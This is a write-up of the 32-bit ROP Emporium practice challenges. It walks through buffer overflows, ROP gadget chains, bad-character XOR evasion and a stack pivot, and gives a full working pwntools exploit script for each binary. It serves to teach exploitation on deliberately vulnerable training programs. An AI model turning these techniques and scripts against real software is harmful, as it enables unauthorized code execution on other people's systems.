---
title: 'ROP Emporium Solutions'
layout: single
author_profile: true
permalink: /writeups/rop_emporium
excerpt: 'Solutions for ROP Emporium challenges'
toc: true
toc_sticky: true
toc_label: Questions
---
## About
A writeup for the [**ROP Emporium**](https://ropemporium.com/) challenges. This series of challenges serves as a practice for ROP technique targeting 32 bit binaries.  

## Challenge 1: Ret2win (x86)

For the first challenge we are given the following files. The following image shows the results of checksec.

| Filename              | MD5 hash                            |
| --------------------- | ----------------------------------- |
| ret2win32             | 99dacb74d6e8658339a6d1052ac5e165    |
| flag.txt                | ce0d8b514b2237cb72ebfade8ba9b1fe    |

![checksec](/assets/images/rop_emp/ret2win32/checksec.png)

We note that there is likely a buffer overflow vulnerability in the binary and we do not have to account for bad characters. 

![checksec](/assets/images/rop_emp/ret2win32/run.png)

We can validate this by looking at the `pwnme` function located at address 0x80485AD. We can see that the function read was called, and reads 56 bytes into a buffer. However, the buffer only has space for 32 bytes, meaning that a buffer overflow will occur. 

![read](/assets/images/rop_emp/ret2win32/read.png)
![stack](/assets/images/rop_emp/ret2win32/stack.png)

Additionally, we see a `ret2win` function at address `0x804862C`. Thus, we have to overwrite the return address using the buffer overflow vulnerability and call the `ret2win` function. 

![win](/assets/images/rop_emp/ret2win32/winfunc.png)

Based on the stack layout, we will need 44 bytes to overwrite the return address. Alternatively, we can use a cyclic pattern and gdb to determine the offset.

![offset](/assets/images/rop_emp/ret2win32/offset.png)

Thus, the following script was used to solve the challenge.

```python
#!/usr/bin/env python3

from pwn import *

def main():
    elf = ELF('ret2win32')
    p = process('./ret2win32')
    
    print(p.recvlines(timeout=1))
    payload = b'A' * 44 + p32(0x804862C)
    
    p.sendline(payload)
    p.interactive()
    
if __name__=='__main__':
    main()
```

![flag](/assets/images/rop_emp/ret2win32/flag.png)

## Challenge 2: Split (x86)

For the second challenge we are given the following files. The following image shows the results of checksec.

| Filename              | MD5 hash                            |
| --------------------- | ----------------------------------- |
| split32                 | b559126d809ee9345baa3467399898a4    |
| flag.txt                | ce0d8b514b2237cb72ebfade8ba9b1fe    |

![checksec](/assets/images/rop_emp/split32/checksec.png)

Although there was not much information given this time, we know that there is a buffer overflow vulnerability within the binary. 

![run](/assets/images/rop_emp/split32/run.png)

This is because the binary tries to read 96 bytes from the user even though the buffer only can hold 32 bytes.

![read](/assets/images/rop_emp/split32/read.png)
![stack](/assets/images/rop_emp/split32/stack.png)

However, unlike the previous challenge we there is no `ret2win` function that we can call. Instead we need to setup the stack such that we are calling `system()` with the argument `/bin/cat flag.txt`. The offset we use is the same as challenge 1 which is 44 bytes. 

Thus, the following script was used to solve the challenge. Note that we have to add a 4 byte padding after the address of system as we have to account for the return address.

```python
#!/usr/bin/env python3

from pwn import *

def main():
    elf = ELF('split32')
    p = process('./split32')
    
    print(p.recvlines(timeout=1))
    system = elf.symbols['system']
    bin_cat = next(elf.search(b'/bin/cat flag.txt'))
    
    print(f"system is at {hex(system)}")
    print(f"/bin/cat is at {hex(bin_cat)}")
    
    payload = b'A' * 44 + p32(system) + b"B" * 4 + p32(bin_cat)
    
    p.sendline(payload)
    p.interactive()
    
if __name__=='__main__':
    main()
```

![flag](/assets/images/rop_emp/split32/flag.png)

## Challenge 3: Callme (x86)

For the third challenge we are given the following files. The following image shows the result of checksec. 

| Filename              | MD5 hash                            |
| --------------------- | ----------------------------------- |
| callme32              | 3699ce8b170ad18dffb7f02522702e2a    |
| encrypted_flag.dat    | 93420740531cd2edde3409d637665962    |
| key1.dat              | 190c4c105786a2121d85018939108a6c    |
| key2.dat              | 20f4f8ba3a4671d2f1df67db36acb830    |
| libcallme32.so        | 953fb837ba585ae09bbad5e8e7231873    |

![checksec](/assets/images/rop_emp/callme32/checksec.png)

The following are shown when we run the executable. 

![run](/assets/images/rop_emp/callme32/run.png)

Loading the binary into IDA shows the same buffer overflow vulnerability in the `pwnme` function. This time we are writing 512 bytes into a buffer of size 32 bytes. The offset to overwrite the written address is still 44 bytes.

![read](/assets/images/rop_emp/callme32/read.png)

Based on the instructions given, we have to call 3 functions `callme_one()`, `callme_two()` and `callme_three()` in this order with the arguments `0xdeadbeef`, `0xcafebabe`, `0xd00df00d`. To understand how to do this, we have to understand the x86 calling convention and how arguments to functions are setup onto the stack.

Supposed that `f1()` calls `callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)`, the 3 arguments are pushed into the stack from right to left. Next, the return address, which is the next instruction after the call is pushed into the stack before entering `callme_one()`. Within `callme_one()` is the function prologue which saves the `ebp` register and create space for local variables. This region starting from `arg3 (0xd00df00d)` to the top of the stack is the stack frame of `callme_one()`. 

When `callme_one()` returns, the return address is popped into the `eip` thus returning to the next instruction after the call. However, what if we overwrite the return address to the function address of `f1()`. `f1()` now gets continually called which in turn calls `callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d)`.

![call_one](/assets/images/rop_emp/callme32/call_one.png)

Thus, we can take this idea and turn it into our exploit. We exploit the buffer overflow vulnerability and create a fake stack frame in the following manner. The return address is overwritten with the function address of `callme_one()`. Next is the function address of `pwnme()`, which allows `callme_one()` to return to the vulnerable function after execution. Finally we append the 3 arguments in the order which mimics a function call. When the function returns to `pwnme()`, the second payload is sent which then calls `callme_two()` and the same happens for `callme_three()`. Thus solving this challenge. 

![call_one](/assets/images/rop_emp/callme32/stackframe.png)

We now have all the pieces to write our exploit. The following is the python script used to solve this challenge. 

```python
#!/usr/bin/env python3

from pwn import *

def main():
    elf = ELF('callme32')
    libc = ELF('libcallme32.so')
    p = process('./callme32')
    
    print(p.recvlines(timeout=1))
    pwnme = elf.symbols['pwnme']
    
    callmeone = elf.symbols['callme_one']
    callmetwo = elf.symbols['callme_two']
    callmethree = elf.symbols['callme_three']
    
    arg1 = p32(0xdeadbeef)
    arg2 = p32(0xcafebabe)
    arg3 = p32(0xd00df00d)
    
    payload = b'A' * 44 + p32(callmeone) + p32(pwnme) + arg1 + arg2 + arg3
    p.sendline(payload)
    
    payload = b'A' * 44 + p32(callmetwo) + p32(pwnme) + arg1 + arg2 + arg3
    p.sendline(payload)
    
    payload = b'A' * 44 + p32(callmethree) + p32(pwnme) + arg1 + arg2 + arg3
    p.sendline(payload)
    
    p.interactive()
    
if __name__=='__main__':
    main()
```

![flag](/assets/images/rop_emp/callme32/flag.png)

## Challenge 4: Write4 (x86)

For the fourth challenge we are given the following files. The following image shows the result of checksec. 

| Filename              | MD5 hash                            |
| --------------------- | ----------------------------------- |
| write432              | 4fc76e18da05a2d48ebcea46a3339286    |
| flag.txt              | ce0d8b514b2237cb72ebfade8ba9b1fe    |
| libwrite432.so        | 91fb05e5b5496b71cd9268cd79fcb744    |

![checksec](/assets/images/rop_emp/write432/checksec.png)

The following are shown when we run the executable. 

![run](/assets/images/rop_emp/write432/run.png)

If we load the binary into IDA, we can see that the `_pwnme()` function is moved into the `libwrite432.so` file. 

![main](/assets/images/rop_emp/write432/main.png)

Interestingly, we see another function `print_file()` and based on the instruction we need to call this function with the name of the file we want to read. 

![print](/assets/images/rop_emp/write432/print.png)

If we look at the `libwrite432.so` we understand that `_pwnme()` contains the same buffer overflow vulnerability which we can exploit. We note that the challenge wanted us to find a write gadget that let us write a value to memory. However, we first need to know the process mapping and which section are both readable and writable. This lets us find a location to write `flag.txt` into the memory.

If we looking at the process mapping in gdb we can see a few sections which are both readable and writable. One of these locations is `0x0804a000` to `0x0804b000`. This location contains the `.bss` section which is located at `0x0804A020`. 

![mappings](/assets/images/rop_emp/write432/mappings.png)
![bss](/assets/images/rop_emp/write432/bss.png)

If we look at the location `0x0804A020` in memory, we can see that it is empty. Thus we could write to this location before calling `print_file()`. 

![empty](/assets/images/rop_emp/write432/empty.png)

Next, we need to find suitable write gadgets to write the value `flag.txt` into `0x0804A020`. The following shows two of the gadgets which is used in the exploit.

Firstly, we first use the `pop edi` instruction to pop the value `0x0804A020` into `edi`, then we pop `flag` into the `ebp` register. Secondly, the instruction `mov dword ptr [edi], ebp` writes the value `flag` to `0x0804A020`. Thirdly, we pop the value `0x0804A020 + 4` into `edi` and `.txt` into the `ebp` register. Finally we write `.txt` to `0x0804A020 + 4`. Thus this setups the argument into memory and we also know the write location. Thus we can now call `print_flag()` with the argument `0x0804A020`. Note that this is possible due to the lack of ASLR thus we can always expect the `.bss` section to start at `0x0804A020`.

```asm
0x080485aa : pop edi ; pop ebp ; ret
0x08048543 : mov dword ptr [edi], ebp ; ret
```

Thus, we can now write our exploit. The following is the python script used to solve this challenge. 

```python
#!/usr/bin/env python3

from pwn import *

OFFSET = 44

def main():
    elf = ELF('write432')
    libc = ELF('libwrite432.so')
    p = process('./write432')
    
    print(p.recvlines(timeout=1))
    
    print_file = elf.symbols['print_file']
    pop_edi_ebp = p32(0x080485aa)             # 0x080485aa : pop edi ; pop ebp ; ret
    mov_edi_ebp = p32(0x08048543)             # 0x08048543 : mov dword ptr [edi], ebp ; ret
    write_loc = 0x804a030
    
    print(f"print_file is located at {hex(print_file)}")
    
    payload = b'A' * 44
    
    payload += pop_edi_ebp
    payload += p32(write_loc)
    payload += b'flag'
    
    payload += mov_edi_ebp
    
    payload += pop_edi_ebp
    payload += p32(write_loc + 4)
    payload += b'.txt'
    
    payload += mov_edi_ebp
    
    # call print_file
    payload += p32(print_file) 
    payload += b"B" * 4 
    payload += p32(write_loc)
    
    p.sendline(payload)
    
    p.interactive()
    
if __name__=='__main__':
    main()
```

![flag](/assets/images/rop_emp/write432/flag.png)

## Challenge 5: Badchars (x86)

For the fifth challenge we are given the following files. The following image shows the result of checksec. 

| Filename              | MD5 hash                            |
| --------------------- | ----------------------------------- |
| badchars32            | a34f63057ef69504a3afa82514ac808a    |
| flag.txt              | ce0d8b514b2237cb72ebfade8ba9b1fe    |
| libbadchars32.so      | 731706af171315ec53de5b3c13269023    |

![checksec](/assets/images/rop_emp/badchars32/checksec.png)

The following are shown when we run the executable. 

![run](/assets/images/rop_emp/badchars32/run.png)

The binary contains the same vulnerability as the previous 4 challenges. There is a vulnerable function `_pwnme()` in `libbadchars32.so` and the offset to overwrite the `eip` register is 44. This time there is an additional constraint where we cannot have characters such as `x`, `g`,  `a` and `.` in our payload. 

![pwnme](/assets/images/rop_emp/badchars32/checkbadchar.png)

We can use the previous script, and add in more gadgets that can circumvent this check. The gadget chosen was `0x08048547 : xor byte ptr [ebp], bl ; ret`. This gadget is responsible for performing a single byte xor. Thus we can send a partial `flag.txt`, and xor the corresponding byte. Thus this circumvents the constraint, allowing us to write `flag.txt` into memory and calling `print_file()` with this argument. We will write to the same location (`.bss section 0x0804A030`). 

```python
#!/usr/bin/env python3

from pwn import *

OFFSET = 44
BADCHARS = b'\x78\x67\x61\x2e'

def main():
    elf = ELF('badchars32')
    libc = ELF('libbadchars32.so')
    p = process('./badchars32')
    
    print_file = elf.symbols['print_file']
    pop_esi_edi_ebp = p32(0x080485b9)     # 0x080485b9 : pop esi ; pop edi ; pop ebp ; ret
    mov_edi_esi = p32(0x0804854f)         # 0x0804854f : mov dword ptr [edi], esi ; ret
    xor_ebp_bl = p32(0x08048547)          # 0x08048547 : xor byte ptr [ebp], bl ; ret
    pop_ebx = p32(0x804839D)              # 0x0804839D : pop ebx ; ret
    pop_ebp = p32(0x080485bb)             # 0x080485bb : pop ebp ; ret
    xor_key = 0x2B                        # "+"
    
    write_location = 0x0804A030
    
    payload = b"A" * 44
    payload += pop_esi_edi_ebp
    payload += b"fl\x4a\x4c"
    payload += p32(write_location)
    payload += p32(write_location+2)
    
    payload += mov_edi_esi
    
    payload += pop_ebx
    payload += p32(xor_key)
    payload += xor_ebp_bl
    
    payload += pop_ebp
    payload += p32(write_location+3)
    payload += xor_ebp_bl
    
    payload += pop_esi_edi_ebp
    payload += b"\x05t\x53t"
    payload += p32(write_location+4)
    payload += p32(write_location+4)
    
    payload += mov_edi_esi
    
    payload += pop_ebx
    payload += p32(xor_key)
    payload += xor_ebp_bl
    
    payload += pop_ebp
    payload += p32(write_location+6)
    payload += xor_ebp_bl
    
    # call print_file
    payload += p32(print_file) 
    payload += b"B" * 4 
    payload += p32(write_location)
    
    p.sendline(payload)
    p.interactive()
    
if __name__=='__main__':
    main()
```

![flag](/assets/images/rop_emp/badchars32/flag.png)

## Challenge 6: Fluff (x86)

For the sixth challenge we are given the following files. The following image shows the result of checksec. 

| Filename              | MD5 hash                            |
| --------------------- | ----------------------------------- |
| fluff32                | 5c4da4ad1f8c7377d9be0b583c7ffbcf    |
| flag.txt              | ce0d8b514b2237cb72ebfade8ba9b1fe    |
| libfluff32.so          | f49acd78e65f891480742e1bfd4d414c    |

![checksec](/assets/images/rop_emp/fluff32/checksec.png)

The following are shown when we run the executable. 

![run](/assets/images/rop_emp/fluff32/run.png)

This challenge is the same as challenge 4. Similarly, there is a vulnerable `_pwnme()` function in the `*.so` file and we have to exploit it to call `print_file(flag.txt)`. However, this time we have the additional constraint of the lack of useful gadget. 

We use the same strategy as the previous challenge. We will send a buffer of length greater than 44 which overflows the buffer, and write the string `flag.txt` to the `.bss` section (`0x0804A030`). Finally we call `print_file()`, passing the location of the string (`0x0804A030`) as an argument. Now we need to understand how to setup the arguments so that we can call our function.

The following are the gadgets that was used in the challenge. 

* `0x08048555 : xchg byte ptr [ecx], dl ; ret`
    * We used this instruction to write a single byte into `0x0804A030`. This instruction swaps a single byte between the location pointed by `ecx`, and the `dl` register. 
* `0x08048558 : pop ecx ; bswap ecx ; ret`
    * We used this instruction to move `0x0804A030` into `ecx`. Since there is a `bswap ecx` instruction next which reverse the byte order in `ecx`, the value `0x0804A030` was appended in big endian format.
* `0x0804854f : mov eax, 0xdeadbeef ; ret`
    * This instruction sets up the mask for the `pext` instruction which is elaborated below.
* `0x0804854a : pext edx, ebx, eax ; mov eax, 0xdeadbeef ; ret`
    * Based on documentations, this instruction uses a mask in the second source operand (`eax`) to tranfer bits in the first source operand (`ebx`) to the contiguous low order bit positions in the destination (`edx`). Thus we take advantage of this instruction to move our desired value into `edx`. Then we can use `0x08048555 : xchg byte ptr [ecx], dl ; ret` to write a byte into `0x0804A030`. As only 8 bits are filled each time we can effectively place our desired value into the `dl` register. 
    * Take the following example where we try to place the ascii value 'f' into the dl register. We want to place `0110 0110` into `edx`, and the mask is always `0xdeadbeef`. Thus we can work backwards if the mask contains a bit one, we place a single bit from the desired result, else the bit is 0. Thus this allows us to dynamically calculate the value to place in `ebx`.
    * ![flag](/assets/images/rop_emp/fluff32/pext.png)
* `0x08048399 : pop ebx ; ret`
    * This instruction sets up the source operand (`ebx`) for the `pext` instruction shown above. 

Thus, we created the following script to solve the challenge. 

```python
#!/usr/bin/env python3

from pwn import *

OFFSET = 44

def cal(final):
    mask = "1011101111"
    output = []
    final_bitstring = bin(ord(final))[2:].zfill(8)
    
    idx = 0
    for i in mask:
        if i == "1":
            output.append(final_bitstring[idx])
            idx += 1
        else:
            output.append("0")
            
    output = int("".join(output), 2)
    return output
    
def construct_payload(write_location):
    payload = b""
    flag_string = "flag.txt"
    
    xchg_ecx_dl = p32(0x08048555)         # 0x08048555 : xchg byte ptr [ecx], dl ; ret
    pop_ecx_bswap = p32(0x08048558)       # 0x08048558 : pop ecx ; bswap ecx ; ret
    pext_mov_eax = p32(0x0804854a)        # 0x0804854a : pext edx, ebx, eax ; mov eax, 0xdeadbeef ; ret
    mov_eax = p32(0x0804854f)             # 0x0804854f : mov eax, 0xdeadbeef ; ret
    pop_ebx = p32(0x08048399)             # 0x08048399 : pop ebx ; ret
    
    for i in range(len(flag_string)):
        payload += pop_ecx_bswap
        payload += p32(write_location+i, endian='big')
        
        payload += pop_ebx
        payload += p32(cal(flag_string[i]))
        payload += pext_mov_eax
        
        payload += xchg_ecx_dl
        
    return payload
    
def main():
    elf = ELF('fluff32')
    libc = ELF('libfluff32.so')
    p = process('./fluff32')
    
    print_file = elf.symbols['print_file']
    write_location = 0x0804A030
    mov_eax = p32(0x0804854f)                 # 0x0804854f : mov eax, 0xdeadbeef ; ret
        
    payload = b"A" * 44
    payload += mov_eax
    payload += construct_payload(write_location)
    
    # call print_file
    payload += p32(print_file) 
    payload += b"B" * 4 
    payload += p32(write_location)
    
    p.sendline(payload)
    p.interactive()
    
if __name__=='__main__':
    main()
```

![flag](/assets/images/rop_emp/fluff32/flag.png)

## Challenge 7: Pivot (x86)

For the seventh challenge we are given the following files. The following image shows the result of checksec. 

| Filename              | MD5 hash                            |
| --------------------- | ----------------------------------- |
| pivot32                | 7994856d9e66f5a70b78f0edaf653cab    |
| flag.txt              | ce0d8b514b2237cb72ebfade8ba9b1fe    |
| libpivot32.so          | 07f421c6c98b0c4279f8116b02eb36d5    |

![checksec](/assets/images/rop_emp/pivot32/checksec.png)

The following are shown when we run the executable. In this challenge, we have to perform a stack pivot due to the limited stack space. We are given a value to pivot to which we can use for our exploit. 

![run](/assets/images/rop_emp/pivot32/run.png)

If we look into the binary, we can see that we have to send in two payload. The first would contain our ROP chain which is placed at the stack address we need to pivot to. The second payload is used to smash the stack and would faciliate the stack pivot. Note that this time the function `ret2win()` was not called in `pivot32`. Thus we have to resolve the address of `ret2win()` manually and add it to our payload.

![re](/assets/images/rop_emp/pivot32/re.png)

When looking at the protection mechanism of `libpivot32.so`, we can see that position independent executable (PIE) is enabled. However, the difference between two functions is always the same. Thus if we can find the address of a function (e.g. `foothold_function`) we can find the address of another function by adding the offset between these two functions. 

![checkseclib](/assets/images/rop_emp/pivot32/checkseclib.png)

Running the binary in GDB shows the function address of `foothold_function` and `ret2win`. The difference between these two functions is `0x1F7`.

![checkseclib](/assets/images/rop_emp/pivot32/gdb.png)

Now we need to get the function address of `foothold_function`. We can first call the function `foothold_function` which populates the .got.plt with the function address, then read the .got.plt.  With the function address we then add the offset `0x1F7`, which now becomes the function address of `ret2win` and call it. Note that we use this `0x08048830 : mov eax, dword ptr [eax] ; ret` gadget to get the function address of `foothold_function` from the .got.plt section. 

However, we do note that the stack is not large enough to hold the entire payload, thus we cannot call this immediately. What the challenge wants use to do is to perform a stack pivot the jump to the actual payload. Stack pivot can be easily done using this gadget `# 0x0804882e : xchg esp, eax ; ret` which swaps the values in the `esp` and `eax` register. We also know where we can place our actual payload which makes this challenge much easier.

Hence we use the following gadgets for the payloads. The first two gadgets are used for the stack pivot, jumping directly to our actual payload. This causes `foothold_function` to be called, populating the .got.plt section. After the .got.plt section was populated we can get the function address of `foothold_function`, add `0x1F7` and call `ret2win` allowing us to get the flag. 

```asm
    0x0804882e : xchg esp, eax ; ret
    0x0804882c : pop eax ; ret

    0x08048830 : mov eax, dword ptr [eax] ; ret
    0x08048833 : add eax, ebx ; ret
    0x080484a9 : pop ebx ; ret
    0x080485f0 : call eax
```

With all these information, we can now write our exploit and get the flag. 

```python
#!/usr/bin/env python3

from pwn import *

OFFSET = 44

def main():
    elf = ELF('pivot32')
    libc = ELF('libpivot32.so')
    p = process('./pivot32')
    
    foothold_got = p32(elf.got['foothold_function'])
    foothold_plt = p32(elf.plt['foothold_function'])
    
    xchg_esp_eax = p32(0x0804882e)    # 0x0804882e : xchg esp, eax ; ret
    pop_eax = p32(0x0804882c)         # 0x0804882c : pop eax ; ret
    mov_eax_eax = p32(0x08048830)     # 0x08048830 : mov eax, dword ptr [eax] ; ret
    add_eax_ebx = p32(0x08048833)     # 0x08048833 : add eax, ebx ; ret
    pop_ebx = p32(0x080484a9)         # 0x080484a9 : pop ebx ; ret
    call_eax = p32(0x080485f0)        # 0x080485f0 : call eax
    
    leak = p32(int(p.recvlines(timeout=1)[4][-8:], 16))
    print(f"Leaked address is {hex(u32(leak))}")
    offset = p32(0x1F7)
    
    payload_long = foothold_plt
    payload_long += pop_eax
    payload_long += foothold_got
    payload_long += mov_eax_eax
    payload_long += pop_ebx
    payload_long += offset
    payload_long += add_eax_ebx
    payload_long += call_eax
    
    p.sendline(payload_long)
    print(p.recvlines(timeout=1))
    
    payload_short = b"A" * 44
    payload_short += pop_eax
    payload_short += leak
    payload_short += xchg_esp_eax
    
    p.sendline(payload_short)
    p.interactive()
    
if __name__=='__main__':
    main()
```

![flag](/assets/images/rop_emp/pivot32/flag.png)